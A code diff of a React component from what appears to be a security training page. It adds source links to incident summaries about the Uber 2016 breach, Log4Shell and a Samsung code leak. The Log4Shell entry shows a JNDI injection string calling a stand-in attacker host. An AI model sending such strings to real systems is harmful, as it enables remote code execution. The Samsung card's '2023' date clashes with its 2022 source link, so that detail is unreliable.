@@ -302,15 +302,15 @@ const Day4 = () => {
             <ArchitectNote title="Real-World Incidents — What Happens When This Fails">
               <div className="space-y-3">
                 <div className="p-3 border border-gray-700/50 bg-gray-800/40">
-                  <p className="text-red-400 text-xs font-bold mb-1">Uber — 57 Million Records (2016)</p>
+                  <p className="text-red-400 text-xs font-bold mb-1">Uber — 57 Million Records (2016) <a href="https://www.ftc.gov/news-events/news/press-releases/2018/04/uber-technologies-inc-settles-ftc-allegations-it-made-deceptive-privacy-and-data-security-claims" target="_blank" rel="noopener noreferrer" className="ml-1 text-indigo-400 hover:text-indigo-300 font-normal">↗ source</a></p>
                   <p className="text-gray-400 text-xs">Two attackers discovered Uber engineer AWS access keys hardcoded in a private GitHub repository. Using those keys, they accessed an S3 bucket containing a backup file with 57 million rider and driver records. Uber paid a $100,000 ransom and concealed the breach for over a year. <span className="text-gray-300">Lesson: managed identities eliminate the class of vulnerability entirely. If the app had used IAM roles instead of access keys, there would have been nothing to steal from the repo.</span></p>
                 </div>
                 <div className="p-3 border border-gray-700/50 bg-gray-800/40">
-                  <p className="text-red-400 text-xs font-bold mb-1">Apache Log4Shell — CVE-2021-44228</p>
+                  <p className="text-red-400 text-xs font-bold mb-1">Apache Log4Shell — CVE-2021-44228 <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a" target="_blank" rel="noopener noreferrer" className="ml-1 text-indigo-400 hover:text-indigo-300 font-normal">↗ source</a></p>
                   <p className="text-gray-400 text-xs">A JNDI injection vulnerability in Apache Log4j allowed attackers to trigger remote code execution by sending a crafted string in any logged field (e.g., User-Agent header: <code className="text-yellow-400">${'{'}jndi:ldap://attacker.com/exploit{'}'}</code>). Affected millions of Java applications globally. <span className="text-gray-300">Lesson: dependency scanning (SCA) with SBOMs and automated CVE alerting is mandatory. Software Composition Analysis catches this class of vulnerability at build time, not after deployment.</span></p>
                 </div>
                 <div className="p-3 border border-gray-700/50 bg-gray-800/40">
-                  <p className="text-red-400 text-xs font-bold mb-1">Samsung Internal Source Code Leak via GitLab (2023)</p>
+                  <p className="text-red-400 text-xs font-bold mb-1">Samsung Internal Source Code Leak via GitLab (2023) <a href="https://techcrunch.com/2022/03/07/samsung-source-code-leak/" target="_blank" rel="noopener noreferrer" className="ml-1 text-indigo-400 hover:text-indigo-300 font-normal">↗ source</a></p>
                   <p className="text-gray-400 text-xs">Samsung's internal GitLab instance was exposed publicly. Repositories contained hardcoded credentials, API keys for internal services, and proprietary source code including Galaxy device software. <span className="text-gray-300">Lesson: secret scanning must be enforced server-side (push rules, not just client-side hooks). Access to code repositories must require authentication with MFA — code repos are crown jewels.</span></p>
                 </div>
               </div>
